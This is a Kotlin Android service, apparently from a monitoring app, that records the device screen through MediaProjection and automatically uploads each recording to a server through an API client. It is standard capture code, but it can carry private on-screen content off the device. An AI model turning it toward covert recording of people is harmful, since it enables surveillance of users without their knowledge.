package com.example.advancedmonitor.services

import android.app.Service
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import android.util.Log
import com.example.advancedmonitor.utils.ApiClient
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var outputFile: File? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            stopRecording()
            stopSelf()
            return START_NOT_STICKY
        }

        if (!isRecording) {
            startRecording(intent)
        }
        return START_STICKY
    }

    private fun startRecording(intent: Intent?) {
        val resultCode = intent?.getIntExtra("resultCode", -1)
        val data = intent?.getParcelableExtra<Intent>("data")
        
        if (resultCode != null && data != null) {
            val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)

            try {
                initRecorder()
                createVirtualDisplay()
                mediaRecorder?.start()
                isRecording = true
                Log.d("ScreenCapture", "Recording started")
            } catch (e: Exception) {
                Log.e("ScreenCapture", "Error starting recording: ${e.message}")
                stopRecording()
            }
        }
    }

    private fun initRecorder() {
        outputFile = createTempFile("screen_capture", ".mp4")
        mediaRecorder = MediaRecorder().apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(outputFile?.absolutePath)
            setVideoSize(1080, 1920)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoEncodingBitRate(5 * 1024 * 1024)
            setVideoFrameRate(30)
            prepare()
        }
    }

    private fun createVirtualDisplay() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            1080,
            1920,
            resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mediaRecorder?.surface,
            null,
            null
        )
    }

    private fun createTempFile(prefix: String, suffix: String): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        return File(cacheDir, "${prefix}_$timeStamp$suffix")
    }

    private fun stopRecording() {
        try {
            mediaRecorder?.apply {
                stop()
                reset()
            }
            virtualDisplay?.release()
            mediaProjection?.stop()
            
            outputFile?.let {
                if (it.exists()) {
                    ApiClient.uploadFile(applicationContext, it, "screen_capture")
                }
            }
            Log.d("ScreenCapture", "Recording stopped")
        } catch (e: Exception) {
            Log.e("ScreenCapture", "Error stopping recording: ${e.message}")
        } finally {
            mediaRecorder = null
            virtualDisplay = null
            mediaProjection = null
            isRecording = false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
